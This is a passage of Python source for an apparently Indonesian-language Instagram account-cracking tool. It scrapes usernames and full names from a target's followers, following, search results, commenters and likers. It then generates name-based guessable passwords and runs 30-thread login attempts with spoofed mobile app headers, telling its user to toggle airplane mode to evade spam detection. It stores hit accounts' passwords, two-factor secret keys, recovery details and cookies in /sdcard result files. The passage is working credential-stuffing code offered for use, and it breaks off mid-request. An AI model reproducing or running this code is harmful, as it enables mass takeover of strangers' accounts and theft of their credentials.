           cookie = json.loads(open('Cookie_Instagram.json', 'r').read())['Cookie']
           self.Menu_Instagram(created, exspired, sisa, cookie)          
        except (FileNotFoundError) as e:
           Terminal().Clear_Terminal()
           Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
           Console().input(""[bold grey50]   ╰─> File Not Found Error!!.."")
           self.Remove_Cookie()
           
    def Menu_Instagram(self, created, exspired, sisa, cookie):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookie)
        except (KeyError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Cookie Exspired Atau Limite!!.."")
            self.Remove_Cookie() 
            
        except (requests.exceptions.ConnectionError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Koneksi Anda Error!!.."")
            self.Chek_Cookies()
        try:                     
            Terminal().Banner_Terminal() 
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Username [bold green]{self.username}\n[bold green]•[bold white] Fullname [bold green]{self.fullname}', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info Akun) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Bergabung [bold green]{created}\n[bold green]•[bold white] Expired [bold green]{exspired} [bold yellow]{sisa}[bold white] hari', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info License) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            Console().print(Columns(self.Kilometers))
        except (AttributeError) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        Console(width = 65, style = ""bold grey50"").print(Panel('''[bold white][bold green]01[bold white]. Crack Nama Dari Follower\t[bold white][bold green]06[bold white]. Chek Result Crack\n[bold white][bold green]02[bold white]. Crack Nama Dari Followed\t[bold white][bold green]07[bold white]. Beralih Ke Facebook\n[bold white][bold green]03[bold white]. Crack Nama Dari Search\t[bold white][bold green]00[bold red].[bold red] Deleted Cookies\n[bold white][bold green]04[bold white]. Crack Nama Dari Komentar\n[bold white][bold green]05[bold white]. Crack Nama Dari Likes''', subtitle = ""╭─────"", subtitle_align = ""left""))
        query = Console().input(""[bold grey50]   ╰─> "")
        if query == '01' or query == '1':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Followers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '02' or query == '2':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Following(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '03' or query == '3':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    try: self.Dump_Search(self.username, cookie)
                    except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '04' or query == '4':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Komentar(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '05' or query == '5':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Likers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '06' or query == '6':
            try:
                Console(width=65).print(Panel('[bold green]01[bold white]. Chek Result OK\n[bold green]02[bold white]. Chek Result 2F\n[bold green]03[bold white]. Chek Result CP',style='bold grey50'), justify='center')
                choose = Console().input(""[bold grey50]   ╰─> "")
                if choose =='01' or choose =='1':
                    try:
                        file = os.listdir('/sdcard/OK')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic green]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File OK) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File OK, Masukan Nama File, Misalnya : [bold green]OK-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='02' or choose =='2':
                    try:
                        file = os.listdir('/sdcard/2F')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File 2F) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File 2F, Masukan Nama File, Misalnya : [bold red]2F-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='03' or choose =='3':
                    try:
                        file = os.listdir('/sdcard/CP')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic yellow]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File CP) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File CP, Masukan Nama File, Misalnya : [bold yellow]CP-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                else:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                    exit()   
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '07' or query == '7':
            try: Facebook()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                              
        elif query == '00' or query == '0':
            try: self.Remove_Cookie()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
        else:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()               
                  
    def Dump_Search(self, username, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={self.username}&rank_token=0.11856792192547738&include_reel=true',headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie':cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(self.username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Search(self.username, cookie)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass       
            
    def Dump_Followers(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/followers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Followers(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Following(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/following/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Following(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Komentar(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/comments/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['comments']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Likers(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/likers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Result(self, result, isi):
        if result in ('1','01'):
            for buka in open(f'/sdcard/OK/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f'\r╭ auth secure account',style='green'); true.add(f""status two {buka.split('|')[6]}""); true.add(f""secret key {buka.split('|')[7]}""); true.add(f""pemulihan {buka.split('|')[8]}""); true.add(f""telephone {buka.split('|')[9]}""); true.add(f""add email {buka.split('|')[10]}""); true.add(f""web email {buka.split('|')[11]}""); true = tree.add(f""Cookie {buka.split('|')[12]}""); tree.add(""Success cek in Result OK""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f""Cookie {buka.split('|')[6]}""); tree.add(""Success cek in Result OK""); printz(tree)
                    
        elif result in ('2','02'):
            for buka in open(f'/sdcard/2F/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='red'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                
        elif result in ('3','03'):
            for buka in open(f'/sdcard/CP/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='yellow'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result CP""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result CP""); printz(tree)   
            
    def Methode(self):
        try:
            self.Meterans.append(Panel(f'[bold green]01.[bold white] Methode [bold green]Api V1\n[bold green]02.[bold white] Methode [bold green]Api Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Api) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50', subtitle = ""╭─────"", subtitle_align = ""left""))
            self.Meterans.append(Panel(f'[bold green]03.[bold white] Methode [bold green]Ajax V1\n[bold green]04.[bold white] Methode [bold green]Ajax Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Ajax) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50'))
            Console().print(Columns(self.Meterans))
            Methode_Login = Console().input(""[bold grey50]   ╰─> "")
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Apakah Anda Ingin Menggunakan Auto Amankan Data Akun OK (y/t)"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Secure Akun) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Secure_Akun = Console().input(""[bold grey50]   ╰─> "")
            if Secure_Akun =='y' or Secure_Akun =='ya':
                self.amankan_akun.append('ya')
            self.Exec_Methode(Methode_Login)
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()                
        
    def Simpan_Result(self):
        self.waktu = datetime.datetime.now()
        self.bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        return(f'OK-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}', f'2F-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}',f'CP-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}')
        
    def Password(self, fullname):
        self.one = []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
            else: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
        
    def Exec_Methode(self, Methode_Login):
        try:
            self.result_ok,self.result_two,self.result_cp = self.Simpan_Result()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[bold green]•[bold white] Result OK Tersimpan Di Folder : [bold green]/sdcard/OK/{self.result_ok}\n[bold red]•[bold white] Result 2F Tersimpan Di Folder : [bold red]/sdcard/2F/{self.result_two}\n[bold green]•[bold white] Result CP Tersimpan Di Folder : [bold yellow]/sdcard/CP/{self.result_cp}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Result Instagram) [bold green]<[bold yellow]<[bold red]<""))
            Console(width = 65).print(Panel('[bold white]Mainkan Mode Pesawat Setiap 200 Looping Agar Terhindar Spam!',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Warning Spam) [bold green]<[bold yellow]<[bold red]<',style='white'))
            with ThreadPoolExecutor(max_workers=30) as V:
                for Username_And_Fullname in dump:
                    username, fullname = Username_And_Fullname.split('<=>')
                    password = self.Password(fullname)
                    if Methode_Login in ('1'):
                        V.submit(self.ExecApi, username,password)
                    elif Methode_Login in ('2'):
                        V.submit(self.ExecApi_Threads, username,password)
                    elif Methode_Login in ('3'):
                        V.submit(self.ExecAjax, username,password)
                    elif Methode_Login in ('4'):
                        V.submit(self.ExecAjax_Threads, username,password)
                    else: V.submit(self.ExecApi, username,password)
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Kamu Telah Mendapatkan [bold green]{self.success}[bold white] Hasil OK, [bold yellow]{self.chekpoint}[bold white] Hasil Checkpoint Dan [bold red]{self.faktor}[bold white] Hasil Two Faktor, Dari {len(dump)} Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()  
        
    def ExecApi(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://i.instagram.com/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
